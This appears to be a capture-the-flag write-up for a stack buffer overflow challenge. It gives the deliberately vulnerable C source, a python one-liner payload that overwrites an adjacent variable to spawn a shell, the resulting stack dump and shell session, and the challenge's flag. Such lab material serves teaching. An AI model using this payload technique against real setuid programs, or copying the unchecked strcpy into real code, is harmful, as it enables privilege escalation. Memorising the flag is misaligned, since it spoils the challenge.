SSH into the server:

cd /problems/stack_overflow_1_3948d17028101c40

Source:

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <unistd.h>

#include <sys/types.h>

#include "dump_stack.h"



void vuln(int tmp, char *str) {

    int win = tmp;

    char buf[64];

    strcpy(buf, str);

    dump_stack((void **) buf, 23, (void **) &tmp);

    printf("win = %d\n", win);

    if (win == 1) {

        execl("/bin/sh", "sh", NULL);

    } else {

        printf("Sorry, you lose.\n");

    }

    exit(0);

}



int main(int argc, char **argv) {

    if (argc != 2) {

        printf("Usage: stack_overwrite [str]\n");

        return 1;

    }



    uid_t euid = geteuid();

    setresuid(euid, euid, euid);

    vuln(0, argv[1]);

    return 0;

}

Easy solution: Our argument can hold 64 character and it has to overflow 'win' to be 1:

$ ./simple_overwrite `python -c "print 'A' * 64 + chr(1)"`

Stack dump:
0xfff30764: 0xfff3280c (second argument)
0xfff30760: 0x00000000 (first argument)
0xfff3075c: 0x0804870f (saved eip)
0xfff30758: 0xfff30788 (saved ebp)
0xfff30754: 0xf77b3ff4
0xfff30750: 0x0000223d
0xfff3074c: 0x00000001
0xfff30748: 0x41414141
0xfff30744: 0x41414141
0xfff30740: 0x41414141
0xfff3073c: 0x41414141
0xfff30738: 0x41414141
0xfff30734: 0x41414141
0xfff30730: 0x41414141
0xfff3072c: 0x41414141
0xfff30728: 0x41414141
0xfff30724: 0x41414141
0xfff30720: 0x41414141
0xfff3071c: 0x41414141
0xfff30718: 0x41414141
0xfff30714: 0x41414141
0xfff30710: 0x41414141
0xfff3070c: 0x41414141 (beginning of buffer)
win = 1
sh-4.2$

And now we have a shell:

sh-4.2$ ls
key  simple_overwrite  simple_overwrite.c
sh-4.2$ cat key
overflow_is_best_flow
sh-4.2$ exit

Key: overflow_is_best_flow
